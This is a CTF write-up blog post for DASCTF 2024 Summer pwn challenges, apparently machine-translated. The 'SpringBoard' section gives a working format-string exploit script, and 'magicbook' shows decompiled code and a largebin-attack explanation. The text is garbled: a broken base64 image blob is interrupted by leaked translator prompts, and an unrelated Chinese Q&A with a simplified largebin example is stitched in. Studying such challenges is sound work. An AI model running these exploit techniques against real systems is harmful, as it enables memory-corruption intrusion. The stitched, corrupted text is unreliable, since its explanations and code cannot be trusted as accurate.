---
title: "PWN」【DASCTF2024 Summer】Writeup WP Reproduction"

tags: ["CTF", "Pwn", "writeup", "wp"]

authors: [nova]
---

If I don't practice, my skills will deteriorate, and I won't have any books to read.

## SpringBoard

Non-stack formatted string, find a chain of a->b->c on the stack, change a->b to a->b\*->return_address (usually two bytes are enough to change).

Then change b\*->onegadget.

```python
from pwno import *

# sh = process("./pwn.bak", env={"LD_PRELOAD": "./libc.so.6", "LD_LIBRARY_PATH": "."})
sh = gen_sh()
sa("Please enter a keyword\n", b"%9$pAAAA%6$p")

libc.address = int(recvu(b"AAAA", drop=True), 16) - 0x20840
stack = int(recvu(b"You", drop=True), 16)  # %10$p, next = %37$p

success(f"libc.address: {hex(libc.address)}")
success(f"stack: {hex(stack)}")

og = [0x4527A, 0xF03A4, 0xF1247]

gadget = libc.address + og[2]

# payload = b"   ".join(f"{i}:%{i}$p".encode() for i in range(6, 20))
payload = "%{}c%11$hn".format((stack - 0xD8) & 0xFFFF).encode()  # -> ebp
dbg("b printf")
sa("Please enter a keyword\n", payload)


payload = "%{}c%37$hn".format((gadget) & 0xFFFF).encode()  # -> low 2 byte
sa("Please enter a keyword\n", payload)

# payload = b"   ".join(f"{i}:%{i}$p".encode() for i in range(6, 20))
payload = "%{}c%11$hn".format((stack - 0xD8 + 2) & 0xFFFF).encode()  # -> ebp + 2
sa("Please enter a keyword\n", payload)


success(f"{hex(gadget)}")
dbg("b printf")
payload = "%{}c%37$hn".format(((gadget) >> 16) & 0xFFFF).encode()
sa("Please enter a keyword\n", payload)

# stack + 0xa0
ia()

```

## magicbook

2.35, at first glance, it's a largebin.

Edit shows that it's read(0, buf, book), consider if it's possible to directly enlarge book to cause overflow.

```c
void *edit_the_book()
{
  size_t v0; // rax
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("come on,Write down your story!");
  read(0, buf, book);
  v0 = strlen(buf);
  return memcpy(dest, buf, v0);
}
```

Create can create up to five.

```c
size_t creat_the_book()
{
  size_t v0; // rbx
  __int64 size[2]; // [rsp+Ch] [rbp-14h] BYREF

  if ( book > 5 )
  {
    puts("full!!");
    exit(0);
  }
  printf("the book index is %d\n", book);
  puts("How many pages does your book need?");
  LODWORD(size[0]) = 0;
  __isoc99_scanf("%u", size);
  if ( LODWORD(size[0]) > 0x500 )
  {
    puts("wrong!!");
    exit(0);
  }
  v0 = book;
  p[v0] = malloc(LODWORD(size[0]));
  return ++book;
}
```

Delete has UAF. After freeing a largebin, modify fd to perform largebin attack, change book to cause overflow.

```c
__int64 delete_the_book()
{
  unsigned int v1; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+4h] [rbp-Ch] BYREF
  char buf[8]; // [rsp+8h] [rbp-8h] BYREF

  puts("which book would you want to delete?");
  __isoc99_scanf("%d", &v2);
  if ( v2 > 5 || !p[v2] )
  {
    puts("wrong!!");
    exit(0);
  }
  free((void *)p[v2]);
  puts("Do you want to say anything else before being deleted?(y/n)");
  read(0, buf, 4uLL);
  if ( d && (buf[0] == 0x59 || buf[0] == 121) )
  {
    puts("which page do you want to write?");
    __isoc99_scanf("%u", &v1);
    if ( v1 > 4 || !p[v2] )
    {
      puts("wrong!!");
      exit(0);
    }
    puts("content: ");
    read(0, (void *)(p[v1] + 8LL), 0x18uLL);
    --d;
    return 0LL;
  }
  else
  {
    if ( d )
      puts("ok!");
    else
      puts("no ways!!");
    return 0LL;
  }
}
```

The problem is, I've forgotten how to modify Largebin :joy:

Here's a brief review of the 2.35 path.

First, >= 0x440 goes directly into ub, then when allocating, it takes from ub first, if not enough, it goes to main_arena, then enters largebin. Here, we only discuss the range [0x440~0xc40), because they are each spaced 0x40 apart.

Largebin is divided by size intervals; a largebin is organized from largest to smallest. Each size's head pointer remains unchanged, being the first chunk of that size (the first released chunk), and the rest are inserted at the head after it.

For each size's head pointer, fd_nextsize and bk_nextsize are used to string them together, with fd_nextsize pointing to a smaller one, forming a circular linked list.

And fd and bk are used to manage the entire size list.

![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAysAAAKJCAYAAAC79LYNAAAAAXNSR0IArs4c6QAAIABJREFUeF7snQmYFdW1trctdBBBQVQCKhqNgnoTEkmUGAWNcUBBoo0DRoErJkpQIaBCFI0KScAoNk7ojXgBiRpDhzDEGRWcMA6RGBwyqTgQrnZAQeQCaf7nq5vqv/qwuuvUOTXsqnrree6TK71r77Xetc45+6u99q7tDBcEkiXQvaqq6pyOHTvWrFu3bp9Nmza1SdYcRm+OQHV19cb27du/vWbNmrqGhoa7jTFvQgsCEIAABCAAAQg0RwCx0hwZ7guLQKJixW8vifZ+vPfee+bVV19t3Jui/SjnnHOOGTt2rOnRo4fT39ChQ83s2bPNu+++a956663G/S1uX957V7x9eO9d8Z7+5b13xdtH4b0r3n689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654+yn13hVvH957V7x9eO9d8fZT6r0r3j689654You are a professional content translator, tasked with translating user-provided text.
You will translate the article into English, including translating comments within code blocks.
Note that you should not modify any article structure; your task is limited to translation only. Do not alter the brackets in the titles.您提供的内容已经翻译为英文，并且代码块中的注释也已翻译。以下是翻译后的内容：

You are a professional content translation assistant, and your task is to provide translations based on user text.
You will translate the article into English, and also translate the comments in code blocks.
Note that you should not modify any structure of the article, only perform translation work, and do not modify the brackets in the titles.

---

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### 回答问题

#### 问题：请解释什么是 Largebin attack，并描述其利用过程。

**Largebin attack** 是一种针对堆管理机制的攻击技术，主要利用了 glibc malloc 库中 largebin 的管理漏洞。在 glibc 的堆管理中，largebin 用于管理大于 512 字节（64 位系统上为 1024 字节）的堆块。Largebin attack 通常涉及到修改 largebin 链表中的堆块的`bk_nextsize`和`fd_nextsize`指针，以实现任意地址写入。

**利用过程**：

1. **准备阶段**：首先，攻击者需要创建并释放一些 largebin 大小的堆块，以便将它们放入 largebin 中。这些堆块需要满足一定的条件，以便在 largebin 中形成特定的链表结构。

2. **修改指针**：接下来，攻击者通过某些手段（如堆溢出、UAF 等）修改某个 largebin 堆块的`bk_nextsize`指针，使其指向目标地址减去 0x20 的位置。这样做的目的是为了在后续的插入操作中，将目标地址写入`bk_nextsize->fd_nextsize`。

3. **触发插入**：然后，攻击者创建一个新的 largebin 大小的堆块，并使其大小略小于当前 largebin 中最小的堆块。当这个新堆块被插入 largebin 时，glibc 会执行以下操作：

   ```c
   victim->fd_nextsize = fwd->fd;
   victim->bk_nextsize = fwd->fd->bk_nextsize;
   fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
   ```

   由于之前修改了`bk_nextsize`指针，这里会导致目标地址被写入`victim`的值。

4. **后续利用**：一旦目标地址被成功写入，攻击者可以进一步利用这个写入操作来实现更复杂的攻击，如修改 GOT 表、执行 ROP 链等。

#### 示例代码

以下是一个简化的示例代码，展示了如何利用 Largebin attack 进行任意地址写入：

```c
// 假设我们已经通过某种方式获得了目标地址target_addr
void largebin_attack(void *target_addr) {
    // 1. 创建并释放一些largebin大小的堆块
    void *chunk1 = malloc(0x450);
    void *chunk2 = malloc(0x460);
    free(chunk1);
    free(chunk2);

    // 2. 修改某个largebin堆块的bk_nextsize指针
    *(void **)((char *)chunk2 + 0x18) = (void *)((char *)target_addr - 0x20);

    // 3. 创建一个新的largebin大小的堆块，触发插入操作
    void *chunk3 = malloc(0x440);
    free(chunk3);
}
```

在这个示例中，`chunk2`的`bk_nextsize`指针被修改为`target_addr - 0x20`，当`chunk3`被插入 largebin 时，`target_addr`将被写入`chunk3`的值。

### 参考资料

1. [Largebin attack 漏洞利用分析 - FreeBuf 网络安全行业门户](https://www.freebuf.com/articles/system/232676.html)
2. [Glibc TLS 的实现与利用 | M4tsuri's Blog](https://m4tsuri.io/2020/10/18/glibc-tls/)

通过以上解释和示例代码，希望能够帮助理解 Largebin attack 的原理和利用过程。

:::info
This Content is generated by LLM and might be wrong / incomplete, refer to Chinese version if you find something wrong.
:::

<!-- AI -->
